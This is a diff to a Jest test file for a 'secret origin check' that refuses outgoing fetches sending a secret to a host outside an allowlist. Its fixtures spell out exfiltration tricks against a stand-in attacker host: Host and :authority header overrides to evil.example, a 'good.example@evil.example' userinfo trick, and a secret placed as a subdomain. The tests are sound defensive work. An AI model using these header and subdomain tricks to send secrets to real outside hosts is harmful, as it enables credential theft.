@@ -1817,6 +1817,7 @@ describe('Hog Executor', () => {
 
         describe('secret origin check', () => {
             const SECRET = 'sk_test_origin_0000000000'
+            const HOST_SECRET = 'Sk_Test_Origin_0000000000'
 
             const readCount = async (outcome: string, mode: string): Promise<number> => {
                 const metric = await secretOriginCheckCounter.get()
@@ -2115,24 +2116,53 @@ describe('Hog Executor', () => {
                 expect(result.error === undefined).toBe(sent)
             })
 
-            it('enforce: leaves a secret in the host out of the refusal and the warning', async () => {
-                const secret = 'Sk_Test_Origin_0000000000'
-                const warn = jest.spyOn(logger, 'warn')
-                const invocation = await secretInvocation(
-                    `https://${secret}.evil.example/`,
-                    ['https://good.example'],
-                    'body',
-                    secret
-                )
+            it.each<{ headers: Record<string, string>; sent: boolean }>([
+                { headers: { Host: 'evil.example' }, sent: false },
+                { headers: { HOST: 'Evil.Example:443' }, sent: false },
+                { headers: { host: 'good.example@evil.example' }, sent: false },
+                { headers: { ':authority': 'evil.example' }, sent: false },
+                { headers: { host: 'GOOD.example' }, sent: true },
+                { headers: { Host: 'good.example:443' }, sent: true },
+            ])('enforce: checks the origin a $headers override routes to', async ({ headers, sent }) => {
+                const invocation = await secretInvocation('https://good.example/path', ['https://good.example'])
+                ;(invocation.queueParameters as CyclotronInvocationQueueParametersFetchType).headers = headers
+                if (sent) {
+                    ;(fetch as jest.Mock).mockImplementationOnce(() =>
+                        Promise.resolve({ status: 200, headers: {}, text: () => Promise.resolve('ok') })
+                    )
+                }
 
                 const result = await enforcingExecutor().executeFetch(invocation)
 
-                expect(result.logs.map((log) => log.message)).toEqual([
-                    expect.stringContaining('https://***REDACTED***.evil.example'),
-                ])
-                expect(warn.mock.calls.some(([, , context]) => context?.inputKey === 'api_key')).toBe(true)
-                expect(JSON.stringify([result.logs, warn.mock.calls]).toLowerCase()).not.toContain(secret.toLowerCase())
+                expect(fetch).toHaveBeenCalledTimes(sent ? 1 : 0)
+                expect(result.error === undefined).toBe(sent)
             })
+
+            it.each<{ carriedBy: string; url: string; headers: Record<string, string> }>([
+                { carriedBy: 'the URL', url: `https://${HOST_SECRET}.evil.example/`, headers: {} },
+                {
+                    carriedBy: 'a Host header',
+                    url: 'https://good.example/',
+                    headers: { Host: `${HOST_SECRET}.evil.example` },
+                },
+            ])(
+                'enforce: leaves a secret in a host from $carriedBy out of the refusal and the warning',
+                async ({ url, headers }) => {
+                    const warn = jest.spyOn(logger, 'warn')
+                    const invocation = await secretInvocation(url, ['https://good.example'], 'body', HOST_SECRET)
+                    ;(invocation.queueParameters as CyclotronInvocationQueueParametersFetchType).headers = headers
+
+                    const result = await enforcingExecutor().executeFetch(invocation)
+
+                    expect(result.logs.map((log) => log.message)).toEqual([
+                        expect.stringContaining('https://***REDACTED***.evil.example'),
+                    ])
+                    expect(warn.mock.calls.some(([, , context]) => context?.inputKey === 'api_key')).toBe(true)
+                    expect(JSON.stringify([result.logs, warn.mock.calls]).toLowerCase()).not.toContain(
+                        HOST_SECRET.toLowerCase()
+                    )
+                }
+            )
 
             it.each([
                 ['an undecrypted blob', 'gAAAAAB-not-decrypted'],
